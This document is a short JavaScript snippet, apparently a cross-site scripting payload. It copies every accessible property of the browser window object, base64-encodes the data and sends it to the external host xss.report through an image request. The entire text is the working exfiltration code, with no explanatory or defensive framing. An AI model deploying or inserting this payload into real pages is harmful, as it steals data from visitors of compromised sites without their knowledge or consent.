(function() {
  let snapshot = {};
  for (let k in window) {
    try {
      snapshot[k] = window[k];
    } catch(e) {}
  }

  let encoded = btoa(JSON.stringify(snapshot));
  let img = new Image();
  img.src = "https://xss.report/snap?" + encoded;
})();
